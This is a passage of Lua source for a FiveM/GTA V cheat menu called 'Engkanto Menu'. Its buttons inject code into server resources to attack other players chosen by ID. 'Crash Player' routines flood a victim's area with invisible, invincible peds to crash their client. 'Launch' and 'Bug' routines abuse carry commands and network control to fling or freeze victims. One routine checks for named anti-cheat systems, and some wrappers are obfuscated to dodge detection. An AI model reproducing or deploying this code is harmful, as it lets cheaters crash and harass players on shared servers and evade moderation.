                local spawnedPeds = {}

                for i = 1, 170 do
                    local offsetX = math.random(-2, 2)
                    local offsetY = math.random(-2, 2)
                    local ped = CreatePed(28, pedModel, originalCoords.x + offsetX, originalCoords.y + offsetY, originalCoords.z, originalHeading, true, true)
                    if DoesEntityExist(ped) then
                        SetEntityAsMissionEntity(ped, true, true)
                        SetBlockingOfNonTemporaryEvents(ped, true)
                        SetEntityAlpha(ped, 0, true) 
                        table.insert(spawnedPeds, ped)
                    end
                    Wait(10) 
                end

                SetModelAsNoLongerNeeded(pedModel)

                Wait(500)

                for _, ped in ipairs(spawnedPeds) do
                    if DoesEntityExist(ped) then
                        DeleteEntity(ped)
                    end
                end

                local found, groundZ = GetGroundZFor_3dCoord(originalCoords.x, originalCoords.y, originalCoords.z + 100.0, 0, false)
                if not found then groundZ = originalCoords.z end

                SetEntityCoordsNoOffset(playerPed, originalCoords.x, originalCoords.y, groundZ + 1.0, false, false, false)

                FreezeEntityPosition(playerPed, false)
            end)
        end

        safeCrashEffect()
    ]], targetId, targetId))

    MachoMenuNotification("Engkanto Menu", "Crash Player II for ID: " .. targetId)
end)

MachoMenuButton(ServerTabSections[2], "Crash Player III", function()
    local selectedPlayerId = MachoMenuGetSelectedPlayer()
    local targetId = nil

    if selectedPlayerId and selectedPlayerId > 0 then
        targetId = GetPlayerServerId(selectedPlayerId)
    else
        local manualId = tonumber(MachoMenuGetInputbox(PlayerIdInputBoxHandle))
        if manualId and manualId > 0 then
            targetId = manualId
        else
            MachoMenuNotification("Engkanto Menu", "Enter a valid Player ID or select!")
            return
        end
    end

    local targetPlayer = GetPlayerFromServerId(targetId)
    if targetPlayer == -1 then
        MachoMenuNotification("Engkanto Menu", "Player not found!")
        return
    end

    MachoInjectResourceRaw('any', string.format([[
        local function zL3()
            local function zW6(setFunc)
                return function(...)
                    return setFunc(...)
                end
            end

            local zT4 = zW6(CreateThread)
            local wK9 = zW6(PlayerPedId)
            local dJ8 = zW6(GetEntityCoords)
            local bN7 = zW6(function(pedType, model, coords, heading)
                return CreatePed(pedType, model, coords.x, coords.y, coords.z, heading, true, false)
            end)
            local qF5 = zW6(FreezeEntityPosition)
            local aM3 = zW6(SetEntityVisible)
            local fE2 = zW6(SetEntityAlpha)
            local oC4 = zW6(SetEntityCollision)
            local hS9 = zW6(SetEntityNoCollisionEntity)
            local vR1 = zW6(SetEntityDynamic)
            local tB6 = zW6(SetEntityInvincible)
            local yU8 = zW6(SetEntityProofs)
            local iK7 = zW6(DeleteEntity)
            local rN5 = zW6(StopPedSpeaking)
            local sCF = zW6(SetPedConfigFlag)
            local sBD = zW6(SetEntityCanBeDamaged)
            local sPR = zW6(SetPedCanRagdoll)
            local sPI = zW6(SetPedCanRagdollFromPlayerImpact)
            local sBN = zW6(SetBlockingOfNonTemporaryEvents)
            local sFA = zW6(SetPedFleeAttributes)
            local sCA = zW6(SetPedCombatAttributes)
            local sCB = zW6(SetPedCombatAbility)
            local sCR = zW6(SetPedCombatRange)
            local sCM = zW6(SetPedCombatMovement)
            local sPE = zW6(SetPedAsEnemy)
            local sPA = zW6(DisablePedPainAudio)
            local sPM = zW6(SetPedMute)
            local sAF = zW6(SetAudioFlag)
            local sPS = zW6(SetPedSeeingRange)
            local sPH = zW6(SetPedHearingRange)
            local sPL = zW6(SetPedAlertness)
            local sPN = zW6(SetPedAsNoLongerNeeded)
            local sTB = zW6(table.insert)

            zT4(function()
                local sG3 = false
                local xL2 = false
                if sG3 or xL2 then return end
                sG3 = true
                xL2 = true

                local nF5 = wK9()
                local targetPed = GetPlayerPed(GetPlayerFromServerId(%d))
                if not DoesEntityExist(targetPed) or targetPed == nF5 then
                    sG3 = false
                    xL2 = false
                    return true
                end

                local vL3 = 225514697
                RequestModel(vL3)
                while not HasModelLoaded(vL3) do
                    Citizen.Wait(170)
                end

                local zP1 = {}
                local rF7 = 5
                local pK3 = 15

                for i = 0, pK3 - 1 do
                    targetPed = GetPlayerPed(GetPlayerFromServerId(%d))
                    if not DoesEntityExist(targetPed) then
                        for _, xQ7 in ipairs(zP1) do
                            if DoesEntityExist(xQ7) then iK7(xQ7) end
                        end
                        SetModelAsNoLongerNeeded(vL3)
                        break
                    end

                    local lM4 = dJ8(targetPed)
                    for j = 1, rF7 do
                        local oZ5 = math.random(-3.0, 3.0)
                        local hV8 = math.random(-3.0, 3.0)
                        local rE9 = lM4.z - 4.0
                        local cH2 = bN7(4, vL3, vector3(lM4.x + oZ5, lM4.y + hV8, rE9), math.random(0, 360))
                        if DoesEntityExist(cH2) then
                            -- SAFE wrappers + כל ההגדרות
                            qF5(cH2, true)
                            SetEntityVelocity(cH2, 0.0, 0.0, 0.0)
                            vR1(cH2, false)
                            fE2(cH2, 0, false)
                            aM3(cH2, false, false)
                            oC4(cH2, false, false)
                            hS9(cH2, nF5, true)
                            hS9(nF5, cH2, true)
                            hS9(cH2, cH2, true)
                            sCF(cH2, 292, true)
                            sCF(cH2, 301, true)
                            sCF(cH2, 128, true)
                            sCF(cH2, 287, true)
                            sBD(cH2, false)
                            tB6(cH2, true)
                            yU8(cH2, true, true, true, true, true, true, true, true)
                            sPR(cH2, false)
                            sPI(cH2, false)
                            sCF(cH2, 17, true)
                            sCF(cH2, 297, true)
                            sCF(cH2, 281, true)
                            sCF(cH2, 435, true)
                            sCF(cH2, 430, true)
                            sCF(cH2, 223, true)
                            sCF(cH2, 229, true)
                            sCF(cH2, 149, true)
                            sBN(cH2, true)
                            sFA(cH2, 0, false)
                            sCA(cH2, 46, false)
                            sCA(cH2, 5, false)
                            sCA(cH2, 17, false)
                            sCA(cH2, 0, false)
                            sCB(cH2, 0)
                            sCR(cH2, 0)
                            sCM(cH2, 0)
                            sPE(cH2, false)
                            sPA(cH2, true)
                            sPM(cH2, true)
                            sAF("DisablePedSpeech", true)
                            rN5(cH2)
                            sPS(cH2, 0.0)
                            sPH(cH2, 0.0)
                            sPL(cH2, 0)
                            sPN(cH2)
                            sTB(zP1, cH2)
                            qF5(cH2, true)
                        end
                    end
                    Citizen.Wait(220)
                end

                zT4(function()
                    Citizen.Wait(2000)
                    for _, xQ7 in ipairs(zP1) do
                        if DoesEntityExist(xQ7) then iK7(xQ7) end
                    end
                    SetModelAsNoLongerNeeded(vL3)
                    sG3 = false
                    xL2 = false
                end)

                return true
            end)

            return true
        end

        zL3()
    ]], targetId, targetId))

    MachoMenuNotification("Engkanto Menu", "Crash Player III for ID: " .. targetId)
end)

MachoMenuButton(ServerTabSections[2], "Crash Player IV", function()
    -- בדיקות אנטי-צ'יט
    if GetResourceState("WaveShield") == "started" then
        MachoMenuNotification("Engkanto Menu", "WaveShield Detected!")
        return
    end
    if GetResourceState("ReaperV4") == "started" then
        MachoMenuNotification("Engkanto Menu", "ReaperV4 Detected!")
        return
    end
    if GetResourceState("EC_AC") == "started" then
        MachoMenuNotification("Engkanto Menu", "Eagle AC Detected!")
        return
    end

    -- זיהוי השחקן
    local selectedPlayerClientId = MachoMenuGetSelectedPlayer()
    local manualId = tonumber(MachoMenuGetInputbox(PlayerIdInputBoxHandle))
    local targetId = nil

    if selectedPlayerClientId and selectedPlayerClientId > 0 then
        targetId = GetPlayerServerId(selectedPlayerClientId)
    elseif manualId and manualId > 0 then
        targetId = manualId
    else
        MachoMenuNotification("Engkanto Menu", "Enter a valid Player ID or select!")
        return
    end

    MachoInjectResourceRaw('monitor', [[
        local targetServerId = ]] .. targetId .. [[
        local isSpawning = false
        local hasRun = false

        local function GetTargetPlayer()
            for _, playerId in ipairs(GetActivePlayers()) do
                if GetPlayerServerId(playerId) == targetServerId then
                    return playerId
                end
            end
            return -1
        end

        local function ClearSpawnedEntities(entityList, entityModel)
            for _, entity in ipairs(entityList) do
                if DoesEntityExist(entity) and not IsPedAPlayer(entity) then
                    DeleteEntity(entity)
                end
            end
            if entityModel then
                SetModelAsNoLongerNeeded(entityModel)
            end
        end

        local function DeployEntitiesAtTarget()
            if isSpawning or hasRun then return end
            isSpawning = true
            hasRun = true

            local playerPed = PlayerPedId()
            local selectedPlayer = GetTargetPlayer()
            if selectedPlayer == -1 then
                isSpawning = false
                hasRun = false
                return
            end

            local targetPed = GetPlayerPed(selectedPlayer)
            if not DoesEntityExist(targetPed) or targetPed == playerPed then
                isSpawning = false
                hasRun = false
                return
            end

            local originalCoords = GetEntityCoords(playerPed)
            local targetCoords = GetEntityCoords(targetPed)

            -- Parachute + teleport
            FreezeEntityPosition(playerPed, true)
            TaskSkyDive(playerPed)
            Citizen.Wait(250)

            SetEntityCoordsNoOffset(playerPed, targetCoords.x, targetCoords.y, targetCoords.z + 450.0, true, true, true)
            FreezeEntityPosition(playerPed, true)
            TaskSkyDive(playerPed)

            -- Heading to target
            local dx = targetCoords.x - originalCoords.x
            local dy = targetCoords.y - originalCoords.y
            SetEntityHeading(playerPed, math.deg(math.atan2(dy, dx)) - 90.0)

            -- Spawn entities around target
            local pedModel = GetHashKey("player_one")
            RequestModel(pedModel)
            while not HasModelLoaded(pedModel) do Citizen.Wait(250) end

            local spawnedEntities = {}
            local maxEntitiesPerBatch = 5
            local maxIterations = 27

            for i = 0, maxIterations - 1 do
                targetPed = GetPlayerPed(GetTargetPlayer())
                if not DoesEntityExist(targetPed) then break end

                local coords = GetEntityCoords(targetPed)
                for j = 1, maxEntitiesPerBatch do
                    local offsetX, offsetY = math.random(-3.0, 3.0), math.random(-3.0, 3.0)
                    local entity = CreatePed(4, pedModel, coords.x + offsetX, coords.y + offsetY, coords.z + 2.0, math.random(0, 360), true, false)
                    if DoesEntityExist(entity) then
                        FreezeEntityPosition(entity, true)
                        SetEntityAlpha(entity, 0, false)
                        SetEntityVisible(entity, false, false)
                        SetBlockingOfNonTemporaryEvents(entity, true)
                        SetPedAsNoLongerNeeded(entity)
                        SetEntityAsMissionEntity(entity, true, true)
                        SetPedCanRagdoll(entity, true)
                        SetEntityVisible(entity, true, 0)
                        SetEntityInvincible(entity, true)
                        SetEntityProofs(entity, true, true, true, true, true, true, true, true)
                        TaskWanderStandard(entity, 10.0, 10)
                        table.insert(spawnedEntities, entity)
                    end
                end
                Citizen.Wait(120)
            end

            SetModelAsNoLongerNeeded(pedModel)

            Citizen.CreateThread(function()
                Citizen.Wait(3000)
                ClearSpawnedEntities(spawnedEntities, pedModel)
                SetEntityCoords(playerPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false, true)
                FreezeEntityPosition(playerPed, false)
                isSpawning = false
                hasRun = false
            end)
        end

        Citizen.CreateThread(function()
            DeployEntitiesAtTarget()
        end)
    ]])

    MachoMenuNotification("Engkanto Menu", "Crash Player IV for ID: " .. targetId)
end)

MachoMenuButton(ServerTabSections[2], "Launch Player", function()
    local targetId = tonumber(MachoMenuGetInputbox(PlayerIdInputBoxHandle))
    if not targetId or targetId == 0 or targetId == GetPlayerServerId(PlayerId()) then 
        return 
    end
    local targetModel =  -699955605
        MachoInjectResource('monitor', string.format[[
        local tId = ]] .. targetId .. [[
        local model = ]] .. targetModel .. [[
        
        local targetPlayer = GetPlayerFromServerId(tId)
        local targetPed = GetPlayerPed(targetPlayer)
        
        if not DoesEntityExist(targetPed) then
            for _, player in ipairs(GetActivePlayers()) do
                if GetPlayerServerId(player) == tId then
                    targetPed = GetPlayerPed(player)
                    break
                end
            end
        end

        if DoesEntityExist(targetPed) then
            RequestModel(model)
            local waitTimer = 0
            while not HasModelLoaded(model) and waitTimer < 100 do 
                Wait(10) 
                waitTimer = waitTimer + 1
            end

            if HasModelLoaded(model) then
                local pos = GetEntityCoords(targetPed)
                local obj = CreateObject(model, pos.x, pos.y, pos.z - 1.5, true, true, true)
                
                if DoesEntityExist(obj) then
                    NetworkRequestControlOfEntity(obj)
                    NetworkRequestControlOfEntity(targetPed)
                    
                    SetEntityVisible(obj, false, true)
                    SetEntityCollision(obj, true, true)
                    SetEntityHasGravity(obj, false) 
                    
                    
                    local timer = 0
                    while timer < 70000 do 
                        if not DoesEntityExist(targetPed) or not DoesEntityExist(obj) then break end

                        SetEntityVelocity(obj, 0.0, 0.0, 10.0)

                        local oCoords = GetEntityCoords(obj)
                        SetEntityCoordsNoOffset(targetPed, oCoords.x, oCoords.y, oCoords.z + 1.2, false, false, false)

                        timer = timer + 1
                        Wait(0)
                    end

                    DeleteEntity(obj)
                end
            end
        end
    ]])
end)

MachoMenuButton(ServerTabSections[2], "Launch Player II", function()
    local rawId = MachoMenuGetInputbox(PlayerIdInputBoxHandle)
    local targetServerId = tonumber(rawId)
    if not targetServerId then return end

    local resName = "monitor" 
    local threadName = "" 

    local scriptToInject = string.format([[
        local targetId = %d
        local myPed = PlayerPedId()
        local oldCoords = GetEntityCoords(myPed)
        
        local targetIdx = GetPlayerFromServerId(targetId)
        if targetIdx ~= -1 then
            local targetPed = GetPlayerPed(targetIdx)
            
            if DoesEntityExist(targetPed) then
                SetEntityVisible(myPed, false, false)
                SetEntityAlpha(myPed, 0, false)
                
                local targetPos = GetEntityCoords(targetPed)
                SetEntityCoordsNoOffset(myPed, targetPos.x, targetPos.y, targetPos.z, false, false, false)
                Wait(150) 

                ExecuteCommand("carry")
                Wait(80)
                ExecuteCommand("buhat")
                Wait(80)
                ExecuteCommand("buhatkita")
                Wait(80)

                local attached = false
                for i = 1, 15 do
                    if IsEntityAttachedToEntity(targetPed, myPed) then
                        attached = true
                        break
                    end
                    Wait(50) 
                end

                if attached then
                    local currentZ = targetPos.z
                    for i = 1, 60 do 
                        currentZ = currentZ + 40.0 
                        SetEntityCoordsNoOffset(myPed, targetPos.x, targetPos.y, currentZ, true, false, false)
                        Wait(10) 
                    end
                    
                    FreezeEntityPosition(myPed, true)
                    Wait(50) 

                    NetworkRequestControlOfEntity(targetPed)
                    
                    for i = 1, 5 do
                        ExecuteCommand("carry")
                        Wait(80) 
                        ExecuteCommand("buhat")
                        Wait(80)
                        ExecuteCommand("buhatkita")
                        Wait(80)
                        DetachEntity(targetPed, true, true)
                        ClearPedTasksImmediately(targetPed)
                        SetPedToRagdoll(targetPed, 10000, 10000, 0, 0, 0, 0)
                        Wait(10)
                    end
                end

                FreezeEntityPosition(myPed, false)
                SetEntityCoords(myPed, oldCoords.x, oldCoords.y, oldCoords.z, false, false, false, false)
                SetEntityVisible(myPed, true, false)
                ResetEntityAlpha(myPed)
            end
        end 
    ]], targetServerId)

    MachoInjectThread(0, resName, threadName, scriptToInject)
end)

MachoMenuButton(ServerTabSections[2], "Launch Player III", function()
    local rawId = MachoMenuGetInputbox(PlayerIdInputBoxHandle)
    local targetServerId = tonumber(rawId)
    if not targetServerId then return end

    local resName = "monitor" 
    local threadName = "" 

    local scriptToInject = string.format([[
                    local targetId = %d
                    local myPed = PlayerPedId()
                    local originalCoords = GetEntityCoords(myPed)

                    local targetIdx = GetPlayerFromServerId(targetId)
                    if targetIdx ~= -1 then
                        local targetPed = GetPlayerPed(targetIdx)

                        if DoesEntityExist(targetPed) then
                            SetEntityVisible(myPed, false, false)
                            SetEntityAlpha(myPed, 0, false)

                            local currentPos = GetEntityCoords(targetPed)
                            SetEntityCoordsNoOffset(myPed, currentPos.x, currentPos.y, currentPos.z - 1.3, false, false, false)
                            Wait(50)

                            ExecuteCommand("carry")
                            Wait(80) 
                            ExecuteCommand("buhat")
                            Wait(80)
                            ExecuteCommand("buhatkita")
                            Wait(100)

                            local upPos = GetEntityCoords(myPed)
                            SetEntityCoordsNoOffset(myPed, upPos.x, upPos.y, upPos.z + 75.0, false, false, false)
                            Wait(100)

                            ExecuteCommand("carry")
                            Wait(80) 
                            ExecuteCommand("buhat")
                            Wait(80)
                            ExecuteCommand("buhatkita")
                            Wait(200)

                            NetworkRequestControlOfEntity(targetPed)
                            local timeout = 0
                            while not NetworkHasControlOfEntity(targetPed) and timeout < 20 do
                                NetworkRequestControlOfEntity(targetPed)
                                Wait(10)
                                timeout = timeout + 1
                            end
                            DetachEntity(targetPed, true, true)

                            for i = 1, 5 do
                                if IsEntityAttachedToEntity(targetPed, myPed) then
                                    DetachEntity(targetPed, true, true)
                                    Wait(50)
                                else
                                    break
                                end
                            end

                            SetPedToRagdoll(targetPed, 1600000, 1600000, 0, false, false, false)
                            FreezeEntityPosition(targetPed, true)
                            Wait(100)

                            SetEntityCoordsNoOffset(myPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false)
                            SetEntityVisible(myPed, true, false)
                            ResetEntityAlpha(myPed)

                            Wait(1000)
                            FreezeEntityPosition(targetPed, false)
                            SetEntityVisible(targetPed, true, false)
                            ResetEntityAlpha(targetPed)
                        end
                    end
                ]], targetServerId)

    MachoInjectThread(0, resName, threadName, scriptToInject)
end)

MachoMenuButton(ServerTabSections[2], "Launch Player IV", function()
    local rawId = MachoMenuGetInputbox(PlayerIdInputBoxHandle)
    local targetServerId = tonumber(rawId)
    if not targetServerId then return end

    local resName = "monitor" 
    local threadName = "" 

    local scriptToInject = string.format([[
                    local targetId = %d
                    local myPed = PlayerPedId()
                    local originalCoords = GetEntityCoords(myPed)

                    local targetIdx = GetPlayerFromServerId(targetId)
                    if targetIdx ~= -1 then
                        local targetPed = GetPlayerPed(targetIdx)

                        if DoesEntityExist(targetPed) then
                            SetEntityVisible(myPed, false, false)
                            SetEntityAlpha(myPed, 0, false)

                            local currentPos = GetEntityCoords(targetPed)
                            SetEntityCoordsNoOffset(myPed, currentPos.x, currentPos.y, currentPos.z - 1.3, false, false, false)
                            Wait(50)

                            AttachEntityToEntityPhysically(myPed, targetPed, 0, 0.0, 0.0, 0.0, 150.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1, false, false, 1, 2)

                            local upPos = GetEntityCoords(myPed)
                            SetEntityCoordsNoOffset(myPed, upPos.x, upPos.y, upPos.z + 75.0, false, false, false)
                            Wait(100)

                            DetachEntity(myPed, true, true)

                            NetworkRequestControlOfEntity(targetPed)
                            local timeout = 0
                            while not NetworkHasControlOfEntity(targetPed) and timeout < 20 do
                                NetworkRequestControlOfEntity(targetPed)
                                Wait(10)
                                timeout = timeout + 1
                            end
                            DetachEntity(targetPed, true, true)

                            for i = 1, 5 do
                                if IsEntityAttachedToEntity(targetPed, myPed) then
                                    DetachEntity(targetPed, true, true)
                                    Wait(50)
                                else
                                    break
                                end
                            end

                            SetPedToRagdoll(targetPed, 1600000, 1600000, 0, false, false, false)
                            FreezeEntityPosition(targetPed, true)
                            Wait(100)

                            SetEntityCoordsNoOffset(myPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false)
                            SetEntityVisible(myPed, true, false)
                            ResetEntityAlpha(myPed)

                            Wait(1000)
                            FreezeEntityPosition(targetPed, false)
                            SetEntityVisible(targetPed, true, false)
                            ResetEntityAlpha(targetPed)
                        end
                    end
                ]], targetServerId)

    MachoInjectThread(0, resName, threadName, scriptToInject)
end)

MachoMenuButton(ServerTabSections[2], "Launch Player V", function()
    local selectedPlayerClientId = MachoMenuGetSelectedPlayer()
    local targetId = nil

    if selectedPlayerClientId and selectedPlayerClientId > 0 then
        targetId = GetPlayerServerId(selectedPlayerClientId)
    else
        local manualId = tonumber(MachoMenuGetInputbox(PlayerIdInputBoxHandle))
        if manualId and manualId > 0 then
            targetId = manualId
        else
            MachoMenuNotification("Engkanto", "Enter a valid Player ID or select!")
            return
        end
    end

    local targetPlayer = GetPlayerFromServerId(targetId)
    if targetPlayer == -1 then
        MachoMenuNotification("Engkanto", "Player not found!")
        return
    end

    MachoInjectResourceRaw("monitor", string.format([[ 
        local function SafeWrap(fn)
            return function(...) return fn(...) end
        end

        local SafeThread = SafeWrap(CreateThread)
        local SafeWait = SafeWrap(Citizen.Wait)
        local SafePlayerPedId = SafeWrap(PlayerPedId)
        local SafeDoesEntityExist = SafeWrap(DoesEntityExist)
        local SafeGetEntityCoords = SafeWrap(GetEntityCoords)
        local SafeSetEntityVisible = SafeWrap(SetEntityVisible)
        local SafeSetEntityInvincible = SafeWrap(SetEntityInvincible)
        local SafeSetEntityCollision = SafeWrap(SetEntityCollision)
        local SafeAttachEntityToEntityPhysically = SafeWrap(AttachEntityToEntityPhysically)
        local SafeDetachEntity = SafeWrap(DetachEntity)
        local SafeDeleteEntity = SafeWrap(DeleteEntity)
        local SafeSetEntityCoords = SafeWrap(SetEntityCoords)
        local SafeGetHashKey = SafeWrap(GetHashKey)
        local SafeRequestModel = SafeWrap(RequestModel)
        local SafeHasModelLoaded = SafeWrap(HasModelLoaded)
        local SafeCVehicle = SafeWrap(CreateVehicle)

        local function loadVehicleModel(model)
            local modelHash = SafeGetHashKey(model)
            SafeRequestModel(modelHash)
            while not SafeHasModelLoaded(modelHash) do
                SafeWait(0)
            end
            return modelHash
        end

        SafeThread(function()
            local playerPed = SafePlayerPedId()
            local playerCoords = SafeGetEntityCoords(playerPed)
            local targetPed = GetPlayerPed(%d)
            if not SafeDoesEntityExist(targetPed) then return end

            local vehModel = "jugular"
            local vehHash = loadVehicleModel(vehModel)

            -- ניצור את ה"רכב רפאים" ממש מתחת לשחקן
            local ghostVeh = SafeCVehicle(vehHash, playerCoords.x, playerCoords.y, playerCoords.z - 5.0, 0.0, true, false)
            if not SafeDoesEntityExist(ghostVeh) then return end

            SafeSetEntityVisible(ghostVeh, false, 0)
            SafeSetEntityInvincible(ghostVeh, true)
            SafeSetEntityCollision(ghostVeh, false, false)

            -- נחשב גובה שמיים גבוה (בצורה דינמית)
            local _, groundZ = GetGroundZFor_3dCoord(playerCoords.x, playerCoords.y, playerCoords.z, 0)
            local skyHeight = (groundZ or playerCoords.z) + 1500.0 -- גובה עצום באוויר

            -- נעדכן את המיקום של ה"רכב" לגובה השמיים
            SafeSetEntityCoords(ghostVeh, playerCoords.x, playerCoords.y, skyHeight, false, false, false, false)

            -- עכשיו נצמיד את השחקן לרכב, כך שיעוף לשמיים
            SafeAttachEntityToEntityPhysically(
                ghostVeh,
                targetPed,
                0, 0, 0,
                0.0, 0.0, 0.0,
                0.0, 0.0, 300.0, -- כוח פיזי חזק כלפי מעלה
                true, true, true, false, 0
            )

            SafeWait(500)

            SafeDetachEntity(ghostVeh, true, true)
            SafeDeleteEntity(ghostVeh)

            -- הצבה סופית לוודא שהשחקן לא נתקע באוויר
            SafeSetEntityCoords(targetPed, playerCoords.x, playerCoords.y, skyHeight + 50.0, false, false, false, false)
        end)
    ]], targetPlayer))

    MachoMenuNotification("Engkanto", "Launch player ID: " .. targetId)
end)



MachoMenuButton(ServerTabSections[2], "Bug Player", function()
    local rawId = MachoMenuGetInputbox(PlayerIdInputBoxHandle)
    local targetServerId = tonumber(rawId)
    if not targetServerId then return end

    local resName = "monitor" 
    local threadName = "" 

    local scriptToInject = string.format([[
                    local targetId = %d
                    local myPed = PlayerPedId()
                    local originalCoords = GetEntityCoords(myPed)

                    local targetIdx = GetPlayerFromServerId(targetId)
                    if targetIdx ~= -1 then
                        local targetPed = GetPlayerPed(targetIdx)

                        if DoesEntityExist(targetPed) then
                            SetEntityVisible(myPed, false, false)
                            SetEntityAlpha(myPed, 0, false)

                            local targetPos = GetEntityCoords(targetPed)
                            SetEntityCoordsNoOffset(myPed, targetPos.x, targetPos.y, targetPos.z - 1.3, false, false, false)
                            Wait(50)

                            ExecuteCommand("carry")
                            Wait(80)
                            ExecuteCommand("buhat")
                            Wait(80)
                            ExecuteCommand("buhatkita") -- Carry
                            Wait(80)

                            local highZ = targetPos.z + 30.0
                            SetEntityCoordsNoOffset(myPed, targetPos.x, targetPos.y, highZ, false, false, false)
                            Wait(80)

                            local groundZ = targetPos.z - 2.0
                            SetEntityCoordsNoOffset(myPed, targetPos.x, targetPos.y, groundZ, false, false, false)
                            SetEntityVelocity(myPed, 0.0, 0.0, -20.0)
                            Wait(50)

                            ExecuteCommand("carry") 
                            Wait(80)
                            ExecuteCommand("buhat")
                            Wait(80)
                            ExecuteCommand("buhatkita")
                            Wait(50)

                            DetachEntity(targetPed, true, true)
                            SetPedToRagdoll(targetPed, 5000, 5000, 0, false, false, false)

                            SetEntityCoordsNoOffset(myPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false)
                            SetEntityVisible(myPed, true, false)
                            ResetEntityAlpha(myPed)
                        end
                    end
                ]], targetServerId)

    MachoInjectThread(0, resName, threadName, scriptToInject)
end)

MachoMenuButton(ServerTabSections[2], "Bug Player II", function()
    local rawId = MachoMenuGetInputbox(PlayerIdInputBoxHandle)
    local targetServerId = tonumber(rawId)
    if not targetServerId then return end

    local resName = "monitor" 
    local threadName = "" 

    local scriptToInject = string.format([[
                    local targetId = %d
                    local myPed = PlayerPedId()
                    local originalCoords = GetEntityCoords(myPed)

                    local targetIdx = GetPlayerFromServerId(targetId)
                    if targetIdx ~= -1 then
                        local targetPed = GetPlayerPed(targetIdx)

                        if DoesEntityExist(targetPed) then
                            SetEntityVisible(myPed, false, false)
                            SetEntityAlpha(myPed, 0, false)

                            local targetPos = GetEntityCoords(targetPed)
                            SetEntityCoordsNoOffset(myPed, targetPos.x, targetPos.y, targetPos.z - 1.3, false, false, false)
                            Wait(50)

                            ExecuteCommand("carry")
                            Wait(80) 
                            ExecuteCommand("buhat")
                            Wait(80)
                            ExecuteCommand("buhatkita")
                            Wait(80)

                            local targetCurrentPos = GetEntityCoords(targetPed)
                            SetEntityCoordsNoOffset(targetPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false)
                            SetEntityCoordsNoOffset(myPed, targetCurrentPos.x, targetCurrentPos.y, targetCurrentPos.z, false, false, false)
                            Wait(80)

                            ExecuteCommand("carry")
                            Wait(80) 
                            ExecuteCommand("buhat")
                            Wait(80)
                            ExecuteCommand("buhatkita")
                            Wait(50)

                            DetachEntity(targetPed, true, true)

                            SetEntityCoordsNoOffset(myPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false)
                            SetEntityVisible(myPed, true, false)
                            ResetEntityAlpha(myPed)
                        end
                    end
                ]], targetServerId)

    MachoInjectThread(0, resName, threadName, scriptToInject)
end)

MachoMenuButton(ServerTabSections[2], "Bug Player III (make them invisible)", function()
    local rawId = MachoMenuGetInputbox(PlayerIdInputBoxHandle)
    local targetServerId = tonumber(rawId)
    if not targetServerId then return end

    local resName = "monitor" 
    local threadName = "" 

    local scriptToInject = string.format([[
                    local targetId = %d
                    local myPed = PlayerPedId()
                    local originalCoords = GetEntityCoords(myPed)

                    local targetIdx = GetPlayerFromServerId(targetId)
                    if targetIdx ~= -1 then
                        local targetPed = GetPlayerPed(targetIdx)

                        if DoesEntityExist(targetPed) then
                            local currentPos = GetEntityCoords(targetPed)
                            SetEntityCoordsNoOffset(myPed, currentPos.x, currentPos.y, currentPos.z - 1.3, false, false, false)
                            Wait(200)

                            ExecuteCommand("carry")
                            Wait(80) 
                            ExecuteCommand("buhat")
                            Wait(80)
                            ExecuteCommand("buhatkita")
                            Wait(400)

                            SetEntityVisible(myPed, false, false)
                            Wait(200)

                            ExecuteCommand("carry") 
                            Wait(80)
                            ExecuteCommand("buhat")
                            Wait(80)
                            ExecuteCommand("buhatkita")
                            Wait(80)

                            NetworkRequestControlOfEntity(targetPed)
                            local timeout = 0
                            while not NetworkHasControlOfEntity(targetPed) and timeout < 15 do
                                NetworkRequestControlOfEntity(targetPed)
                                Wait(5)
                                timeout = timeout + 1
                            end
                            DetachEntity(targetPed, true, true)
                            ClearPedTasksImmediately(targetPed)
                            Wait(300)

                            SetEntityCoordsNoOffset(myPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false)
                            Wait(200)

                            SetEntityVisible(myPed, true, false)
                            ClearPedTasksImmediately(myPed)
                        end
                    end
                ]], targetServerId)

    MachoInjectThread(0, resName, threadName, scriptToInject)
end)

MachoMenuButton(ServerTabSections[2], "Bug Player IV", function()
    local rawId = MachoMenuGetInputbox(PlayerIdInputBoxHandle)
    local targetServerId = tonumber(rawId)
    if not targetServerId then return end

    local resName = "monitor" 
    local threadName = "" 

    local scriptToInject = string.format([[
                    local targetId = %d
                    local myPed = PlayerPedId()
                    local originalCoords = GetEntityCoords(myPed)

                    local targetIdx = GetPlayerFromServerId(targetId)
                    if targetIdx ~= -1 then
                        local targetPed = GetPlayerPed(targetIdx)

                        if DoesEntityExist(targetPed) then
                            SetEntityVisible(myPed, false, false)
                            SetEntityAlpha(myPed, 0, false)

                            local currentPos = GetEntityCoords(targetPed)
                            SetEntityCoordsNoOffset(myPed, currentPos.x, currentPos.y, currentPos.z - 1.3, false, false, false)
                            Wait(50)

                            ExecuteCommand("carry")
                            Wait(80) 
                            ExecuteCommand("buhat")
                            Wait(80)
                            ExecuteCommand("buhatkita")
                            Wait(100)

                            local upPos = GetEntityCoords(myPed)
                            SetEntityCoordsNoOffset(myPed, upPos.x, upPos.y, upPos.z + 15.0, false, false, false)
                            Wait(100)

                            ExecuteCommand("carry")
                            Wait(80) 
                            ExecuteCommand("buhat")
                            Wait(80)
                            ExecuteCommand("buhatkita")
                            Wait(200)

                            NetworkRequestControlOfEntity(targetPed)
                            local timeout = 0
                            while not NetworkHasControlOfEntity(targetPed) and timeout < 20 do
                                NetworkRequestControlOfEntity(targetPed)
                                Wait(10)
                                timeout = timeout + 1
                            end
                            DetachEntity(targetPed, true, true)

                            for i = 1, 5 do
                                if IsEntityAttachedToEntity(targetPed, myPed) then
                                    DetachEntity(targetPed, true, true)
                                    Wait(50)
                                else
                                    break
                                end
                            end

                            SetPedToRagdoll(targetPed, 3000, 3000, 0, false, false, false)
                            FreezeEntityPosition(targetPed, true)
                            Wait(100)

                            SetEntityCoordsNoOffset(myPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false)
                            SetEntityVisible(myPed, true, false)
                            ResetEntityAlpha(myPed)

                            Wait(1000)
                            FreezeEntityPosition(targetPed, false)
                            SetEntityVisible(targetPed, true, false)
                            ResetEntityAlpha(targetPed)
                        end
                    end
